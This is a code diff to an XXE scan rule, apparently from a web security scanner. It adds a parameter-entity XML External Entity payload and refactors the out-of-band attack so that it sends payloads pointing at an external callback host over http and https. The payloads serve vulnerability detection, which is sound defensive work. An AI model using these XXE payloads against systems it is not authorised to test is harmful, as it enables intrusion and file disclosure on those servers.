@@ -67,9 +67,19 @@ public class XxeScanRule extends AbstractAppPlugin {
                     + "  <!ENTITY zapxxe SYSTEM \"{0}\">\n"
                     + "]>\n";
 
+    static final String PARAMETER_ENTITY_ATTACK_HEADER =
+            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
+                    + "<!DOCTYPE foo [\n"
+                    + "  <!ELEMENT foo ANY >\n"
+                    + "  <!ENTITY % zapxxe SYSTEM \"{0}\"> %zapxxe; \n"
+                    + "]>\n";
+
     protected static final String ATTACK_BODY = "<foo>" + ATTACK_ENTITY + "</foo>";
 
     protected static final String ATTACK_MESSAGE = ATTACK_HEADER + ATTACK_BODY;
+
+    protected static final String PARAMETER_ENTITY_ATTACK_MESSAGE =
+            PARAMETER_ENTITY_ATTACK_HEADER + ATTACK_BODY;
 
     // XML standard from W3C Consortium
     // ---------------------------------------------
@@ -263,19 +273,28 @@ public class XxeScanRule extends AbstractAppPlugin {
                                 .setSource(Alert.Source.ACTIVE)
                                 .build();
                 String oastPayload = extOast.registerAlertAndGetPayload(alert);
-                String payload = MessageFormat.format(ATTACK_MESSAGE, "http://" + oastPayload);
-                alert.setAttack(payload);
-                msg.setRequestBody(payload);
-                sendAndReceive(msg);
-                // Try again with https
-                msg = getNewMsg();
-                payload = MessageFormat.format(ATTACK_MESSAGE, "https://" + oastPayload);
-                msg.setRequestBody(payload);
-                sendAndReceive(msg);
+
+                sendOutOfBandAttack(ATTACK_MESSAGE, oastPayload);
+
+                // Try again with parameter entity
+                sendOutOfBandAttack(PARAMETER_ENTITY_ATTACK_MESSAGE, oastPayload);
             }
         } catch (Exception e) {
             LOGGER.warn("Could not perform OOB XXE File Inclusion Attack.", e);
         }
+    }
+
+    private void sendOutOfBandAttack(String ATTACK_MESSAGE, String oastPayload) throws IOException {
+        HttpMessage msg = getNewMsg();
+        String payload = MessageFormat.format(ATTACK_MESSAGE, "http://" + oastPayload);
+        msg.setRequestBody(payload);
+        sendAndReceive(msg);
+
+        // Try again with https
+        msg = getNewMsg();
+        payload = MessageFormat.format(ATTACK_MESSAGE, "https://" + oastPayload);
+        msg.setRequestBody(payload);
+        sendAndReceive(msg);
     }
 
     /**
